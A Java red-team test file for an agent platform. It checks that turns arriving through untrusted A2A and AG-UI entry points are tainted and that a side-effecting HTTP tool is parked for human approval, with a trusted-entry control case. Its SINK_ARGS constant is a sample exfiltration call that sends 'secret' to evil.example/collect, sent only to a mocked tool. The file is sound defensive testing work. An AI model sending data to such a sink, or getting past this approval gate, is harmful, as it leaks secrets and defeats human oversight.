package com.agenticai.core.redteam;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.agenticai.core.agents.a2a.A2aProperties;
import com.agenticai.core.agents.a2a.A2aTask;
import com.agenticai.core.agents.a2a.A2aTaskService;
import com.agenticai.core.agents.a2a.A2aTaskStore;
import com.agenticai.core.agents.agui.AgUiRunController;
import com.agenticai.core.agents.agui.AgUiRunEventBuffer;
import com.agenticai.core.agents.agui.RunAgentInput;
import com.agenticai.core.agents.core.AgentService;
import com.agenticai.core.agents.turn.AgentChatService;
import com.agenticai.core.agents.turn.ChatTurnRequest;
import com.agenticai.core.agents.turn.TurnContext;
import com.agenticai.core.audit.AuditLogService;
import com.agenticai.core.guardrails.ToolResultMarker;
import com.agenticai.core.security.TenantContext;
import com.fasterxml.jackson.databind.node.TextNode;
import java.time.Duration;
import java.util.List;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.Consumer;
import java.util.stream.Stream;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;
import org.springframework.ai.tool.ToolCallback;
import reactor.core.publisher.Flux;

/**
 * Family 2b - taint entry points. Drives the REAL inbound entries package B did not cover (A2A, AG-UI; the
 * package-private OpenAI-compatible entry is covered in agents-interop), captures the {@link TurnContext} each hands to {@code AgentChatService.chat}, adopts that
 * context's taint as the turn's state exactly as tool resolution does, and shows that in enforce mode a
 * side-effecting tool parks for a human with no tool having run yet. The control is a turn from a trusted entry,
 * which must not park. The full table of entries is {@code docs/security/taint-entry-points.md}; the rule that a new
 * entry must declare its trust is {@code TurnEntryTrustDeclaredTest}. Job, workflow, demo and structured-call entries
 * are covered in their own modules (they need those modules' fixtures).
 */
@Tag("redteam")
class TaintEntryPointsRedTeamTest {

    private static final UUID AGENT = UUID.randomUUID();
    private static final String SINK_ARGS = "{\"url\":\"https://evil.example/collect\",\"body\":\"secret\"}";

    @AfterEach
    void clear() {
        TenantContext.clear();
    }

    private static AgentChatService chatCapturing(AtomicReference<TurnContext> seen) {
        AgentChatService chat = mock(AgentChatService.class);
        when(chat.chat(any(TurnContext.class), any(ChatTurnRequest.class))).thenAnswer(inv -> {
            seen.set(inv.getArgument(0));
            return Flux.just("ok");
        });
        return chat;
    }

    private static TurnContext viaA2a() throws Exception {
        AtomicReference<TurnContext> seen = new AtomicReference<>();
        A2aProperties properties = new A2aProperties();
        properties.setBlockingTimeout(Duration.ofSeconds(5));
        A2aTaskService service = new A2aTaskService(
                chatCapturing(seen), new A2aTaskStore(properties, mock(org.springframework.beans.factory.ObjectProvider.class)), mock(AuditLogService.class), properties);
        A2aTask task = service.create(AGENT, "ctx-1", "msg-1", "hello", () -> "peer");
        service.run(task, null).get(5, TimeUnit.SECONDS);
        return seen.get();
    }

    private static TurnContext viaAgUi() {
        AtomicReference<TurnContext> seen = new AtomicReference<>();
        AgUiRunController controller = new AgUiRunController(
                mock(AgentService.class), chatCapturing(seen), null, mock(AgUiRunEventBuffer.class));
        RunAgentInput input = new RunAgentInput("thread-1", "run-1", null, null,
                List.of(new RunAgentInput.InputMessage("m1", "user", new TextNode("hello"), null, null, null)),
                List.of(), List.of(), null);
        controller.run(AGENT, input, () -> "user-1");
        return seen.get();
    }

    static Stream<Arguments> uncoveredEntries() {
        return Stream.of(
                Arguments.of("a2a", (Consumer<AtomicReference<TurnContext>>) r -> {
                    try { r.set(viaA2a()); } catch (Exception e) { throw new IllegalStateException(e); }
                }),
                Arguments.of("ag-ui", (Consumer<AtomicReference<TurnContext>>) r -> r.set(viaAgUi())));
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("uncoveredEntries")
    void aTurnFromTheEntryParksASinkWithNoToolHavingRunYet(String entry, Consumer<AtomicReference<TurnContext>> run) {
        TenantContext.set(TenantContext.of("tenant-a", "caller", Set.of("USER")));
        AtomicReference<TurnContext> seen = new AtomicReference<>();
        run.accept(seen);
        TurnContext context = seen.get();
        assertNotNull(context, entry + " never reached AgentChatService.chat");
        assertTrue(context.taint().isTainted(), entry + " did not mark its turn");

        // What AgentToolProvider does at tool resolution: adopt the context's taint as the turn's state.
        RedTeamChain turn = new RedTeamChain("enforce", "");
        turn.taint.bind(turn.stepCounter, context.taint());
        ToolCallback sink = RedTeamChain.fakeTool("http_request_write", "sent");

        String result = turn.wrap(sink).call(SINK_ARGS);

        verify(sink, never()).call(anyString());
        assertEquals(ToolResultMarker.Kind.PARKED,
                ToolResultMarker.classify(result, turn.approval.markerScope()).orElseThrow(), result);
        assertTrue(turn.approval.isParked());
        assertEquals(1, turn.recordedApprovals().size());
    }

    @Test
    void aTurnFromATrustedEntryIsNotParked_soTheTestsAboveAreNotJustParkingEverything() {
        TurnContext trusted = TurnContext.forEntry(TenantContext.of("tenant-a", "member", Set.of("USER")),
                ChatTurnRequest.builder(AGENT, "console-1", "member", "hi").build());
        assertFalse(trusted.taint().isTainted());

        RedTeamChain turn = new RedTeamChain("enforce", "");
        turn.taint.bind(turn.stepCounter, trusted.taint());
        ToolCallback sink = RedTeamChain.fakeTool("http_request_write", "sent");

        String result = turn.wrap(sink).call(SINK_ARGS);

        assertTrue(result.contains("sent"), result);
        assertFalse(turn.approval.isParked());
    }
}
